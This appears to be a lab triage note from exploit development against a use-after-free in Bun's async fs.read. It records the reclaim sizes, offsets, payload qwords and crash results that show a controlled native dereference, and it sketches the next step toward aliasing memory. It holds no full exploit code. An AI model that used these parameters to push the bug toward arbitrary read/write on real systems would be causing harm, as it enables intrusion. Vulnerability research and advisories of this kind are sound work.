# fs UAF 96/128 reclaim crash triage — 128-byte class gives controlled deref only

Scope: local Bun/JSC exploit development from the confirmed async
`fs.read` BufferSource UAF. This re-investigates the earlier non-canonical
96-byte and 128-byte reclaim crashes without native helper dylibs and without
the FFI marker callback. Result: the 128-byte reclaim is a real, no-FFI,
attacker-qword-controlled native dereference through small
ArrayBuffer/view metadata. It is still crash-only; no arbitrary R/W,
branch control, marker side effect, or remote reachability is proven.

## Existing crash evidence

Original crash dirs:

| Crash dir | Size | Harness | Payload source | ASan result |
|---|---:|---|---|---|
| `lab/findings/crashes/aadd7fc40d48` | 96 | `typedarray-vector-alias-ffi-oracle.js` | `ptr(source)` via `bun:ffi` diagnostic oracle | READ SEGV at `0x15216fffba226082`, `pc 0x000106b13dfc` |
| `lab/findings/crashes/5805dff9975b` | 128 | `typedarray-vector-alias-ffi-oracle.js` | `ptr(source)` via `bun:ffi` diagnostic oracle | BUS/WRITE high-address fault, `pc 0x0001123a6864` |

The raw logs are tracked under each crash dir's `runs/` subdirectory.
ASan did not print register state or a symbolic stack because macOS 26's
ASan post-detection walker wedges in `sanitizer_procmaps_mac.cpp:272`;
the logs retain only access kind, fault address where available, and PC.

## New no-FFI harness

New harness:

`lab/harnesses/13-arb-rw-probes/reclaim-96-128-crash-triage.js`

It uses only:

* `node:fs` FIFO-backed async `fs.read`
* `ArrayBuffer` detach via `transfer(0)` / structured clone fallback
* JS allocation sprays
* literal payload bytes/qwords from environment variables

No `bun:ffi`, no `dlopen`, no native helper dylib, and no JIT warming are
used by this harness.

Common validation environment:

```sh
ASAN_OPTIONS=halt_on_error=1:abort_on_error=0:exitcode=66:detect_leaks=0:detect_stack_use_after_return=1:strict_string_checks=1:check_initialization_order=1:detect_invalid_pointer_pairs=2:fast_unwind_on_fatal=1:malloc_context_size=64:allocator_may_return_null=0:print_stats=0:symbolize=0:print_module_map=0:quarantine_size_mb=0
TIMEOUT=15..20
Bun: /Users/CJ/Documents/bun_lab/bun/build/release-asan/bun-asan
Bun version: 1.3.14
```

Default harness parameters unless stated otherwise:

```text
VIEW_SIZE=128
SPRAY_COUNT=8192
SPRAY_KIND=u8
DETACH_MODE=transfer
WRITE_OFFSET=16
WRITE_LENGTH=8
PAYLOAD_MODE=u64
PAYLOAD_QWORD=0x4141414142424242
```

## 96-byte class

Command:

```sh
ASAN_OPTIONS=...:quarantine_size_mb=0 \
TIMEOUT=20 ITERATIONS=24 UAF_SIZE=96 VIEW_SIZE=128 SPRAY_COUNT=8192 \
WRITE_OFFSET=16 PAYLOAD_QWORD=0x4141414142424242 \
lab/scripts/triage.sh \
  lab/harnesses/13-arb-rw-probes/reclaim-96-128-crash-triage.js
```

Run `20260510T080326Z-63697`, crash ID `beff01d00e0d`:

```text
iteration 1..5: bytesRead=8, anomalies=[]
ERROR: AddressSanitizer: SEGV on unknown address 0x82828a8284a4848
pc 0x00010a6bbde8
READ memory access
```

Bounded variants:

| Command change | Run | Result |
|---|---|---|
| `PAYLOAD_QWORD=0x4343434344444444`, 12 iterations | `20260510T080357Z-64975` | no crash |
| `PAYLOAD_MODE=byte PAYLOAD_BYTE=0xab`, 16 iterations | `20260510T080432Z-66466` | no crash |
| `WRITE_OFFSET=8`, 8 iterations | `20260510T080357Z-65026` | no crash |
| `WRITE_OFFSET=24`, 8 iterations | `20260510T080357Z-65027` | no crash |

Interpretation: the 96-byte reclaim is real and payload-influenced, but
not an exact "dereference the qword we wrote" primitive under the bounded
checks. It appears value-sensitive and offset-specific. No JS-visible
carrier corruption was observed before the crash (`anomalies=[]`), and no
useful read/write/branch side effect was found.

## 128-byte class

Exact qword deref:

```sh
ASAN_OPTIONS=...:quarantine_size_mb=0 \
TIMEOUT=20 ITERATIONS=24 UAF_SIZE=128 VIEW_SIZE=128 SPRAY_COUNT=8192 \
WRITE_OFFSET=16 PAYLOAD_QWORD=0x4141414142424242 \
lab/scripts/triage.sh \
  lab/harnesses/13-arb-rw-probes/reclaim-96-128-crash-triage.js
```

Run `20260510T080326Z-63699`, crash ID `835359278b90`:

```text
iteration 1..4: bytesRead=8, anomalies=[]
ERROR: AddressSanitizer: SEGV on unknown address 0x4141414142424242
pc 0x00011bbd15ac
READ memory access
```

Payload sensitivity:

| Payload | Run | Result |
|---|---|---|
| `PAYLOAD_QWORD=0x4343434344444444` | `20260510T080357Z-64976` | READ SEGV at `0x4343434344444444` |
| `PAYLOAD_MODE=byte PAYLOAD_BYTE=0xab` | `20260510T080432Z-66465` | READ SEGV at `0xabababababababab` |

Offset check:

| Offset | Run | Result |
|---:|---|---|
| `8` | `20260510T080432Z-66411` | READ SEGV at transformed address `0x82828a8284a4849` |
| `16` | `20260510T080326Z-63699` | READ SEGV at exact qword `0x4141414142424242` |
| `24` | `20260510T080432Z-66412` | READ SEGV at transformed address `0x82828a8284a4849` |

Carrier-kind check at `UAF_SIZE=128 WRITE_OFFSET=16
PAYLOAD_QWORD=0x4141414142424242`:

| `SPRAY_KIND` | Run | Result |
|---|---|---|
| `u8` | `20260510T080326Z-63699` | READ SEGV at exact qword |
| `arraybuffer` | `20260510T080515Z-68368` | READ SEGV at exact qword |
| `dataview` | `20260510T080515Z-68387` | READ SEGV at exact qword |
| `u8-offset` | `20260510T080541Z-70560` | READ SEGV at `0x4141414142424252` (`+0x10`, matching view offset) |
| `rab-u8` | `20260510T080541Z-70559` | READ SEGV at exact qword before first JSON iteration line |
| `float64Array` | `20260510T080515Z-68384` | no crash in 8 iterations |
| `biguint64Array` | `20260510T080515Z-68388` | no crash in 8 iterations |

Interpretation: the 128-byte reclaim is a better candidate than the
96-byte class. Offset 16 behaves like a pointer field in small
ArrayBuffer/view metadata: JSC later reads through the exact qword we
planted. Offset-view behavior (`u8-offset`) adds the legitimate
`byteOffset` (`+0x10`) to the planted qword before dereference, which
is consistent with a backing-store/base pointer field rather than an
unrelated allocator metadata crash.

## Conclusion

Positive result:

* `UAF_SIZE=128 WRITE_OFFSET=16` provides a no-FFI controlled native
  dereference through real ArrayBuffer/view metadata. Literal JS-supplied
  payloads become the ASan fault address exactly for `u8`, `arraybuffer`,
  `dataview`, `rab-u8`, and with a predictable `+byteOffset` adjustment
  for `u8-offset`.

Negative boundary:

* This is still a crash-only dereference. The harness did not produce a
  JS-visible alias, arbitrary native R/W, branch/call control, marker
  file, or remote request path.
* The 96-byte class remains weaker: it is payload-influenced but did not
  show exact-qword dereference across the bounded payload/offset checks.
* Float64/BigUint64 typed-array sprays did not reproduce the 128-byte
  crash in the bounded carrier check, reinforcing that this path is about
  small ArrayBuffer/view metadata rather than typed-array data buffers.

Next useful work is not another broad sweep. The focused follow-up is to
combine the 128-byte offset-16 field with a valid in-process backing-store
pointer and length metadata, then test whether a retained real view can be
made to alias attacker-chosen memory without tripping ASan first. Until
that succeeds, `ADVISORY.md` should remain conservative: no arbitrary R/W,
no FFI-free RCE, and no remote exploitability claim.
